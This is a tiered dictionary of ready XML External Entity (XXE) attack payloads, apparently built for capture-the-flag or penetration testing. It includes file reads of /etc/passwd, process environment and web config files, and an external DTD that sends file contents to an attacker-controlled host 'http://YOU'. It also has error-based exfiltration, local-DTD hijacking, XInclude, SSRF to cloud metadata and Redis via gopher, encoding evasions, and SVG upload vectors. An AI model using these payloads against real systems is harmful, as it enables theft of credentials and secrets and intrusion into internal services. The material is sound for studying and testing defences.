# Payload Dictionary — the ready corpus

## Tier 0 — the harmless echo

```xml
<!DOCTYPE r [<!ENTITY probe "XXE_PROBE">]><r>&probe;</r>
```

## Tier 1 — file reads (in-band)

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///proc/self/environ">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/flag">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///var/www/html/config.php">]><r>&x;</r>
```

## Tier 2 — external DTD bootstrap

```xml
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU/e.dtd"> %d;]><r>&x;</r>
```

`e.dtd`:
```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://YOU/?x=%file;'>">
%wrap;
```

## Tier 3 — error-channel

```xml
<!DOCTYPE r [<!ENTITY % x SYSTEM "file:///nonexist"> %x;]><r/>        — FileNotFound URI
<!DOCTYPE r [<!ENTITY % a "<!ENTITY &#37; file SYSTEM 'file:///flag'>">
<!ENTITY % b "<!ENTITY &#37; wrap '&#37;file;'>"> %a;%b;]><r>&wrap;</r>
```

The classic error-exfil:

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#37; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```

FileNotFound error carries `/nonexistent/<file-content>`.

## Tier 4 — local-DTD hijack

```xml
<!DOCTYPE r [
  <!ENTITY % l SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOtech "<!ENTITY % file SYSTEM 'file:///flag'>
                     <!ENTITY % eval '<!ENTITY &#37; err SYSTEM \"file:///nonexist/%file;\">'>
                     %eval;%err;">
  %l;
]><r>&xxe;</r>
```

## Tier 5 — XInclude (no DOCTYPE)

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</r>
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://internal/admin" parse="text"/>
</r>
```

## Tier 6 — SSRF / OOB

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:8080/admin">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY x SYSTEM "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY % x SYSTEM "http://YOU/x"> %x;]><r/>             — bare OOB hit
```

## Tier 7 — CDATA wrap (special-char files)

```xml
<!DOCTYPE r [
  <!ENTITY % s "<![CDATA[">
  <!ENTITY % f SYSTEM "file:///flag">
  <!ENTITY % e "]]>">
  <!ENTITY % a "<!ENTITY c '%s;%f;%e;'>">
  %a;
]><r>&c;</r>
```

## Tier 8 — encoding variants

```xml
<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [...]><r>&x;</r>     — UTF-16 body
<?xml version="1.0" encoding="IBM037"?>...                              — EBCDIC (Java)
<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE ...                 — 7-bit
```

## Tier 9 — SOAP/XML-RPC/RSS

```xml
<soap:Envelope><soap:Body><m:x xmlns:m="u"><m:p>&x;</m:p></m:x></soap:Body></soap:Envelope>
<methodCall><methodName>m</methodName><params><param><value>&x;</value></param></params></methodCall>
<rss><channel><title>&x;</title></channel></rss>
```

## Tier 10 — SVG / upload

```xml
<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///flag">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>
```

## The "don't fire" list — DoS only

- Billion Laughs ≥3 levels — DoS, never on shared infra
- quadratic-laugh at scale — same
- any payload writing/deleting — none exist; XXE is read/fetch
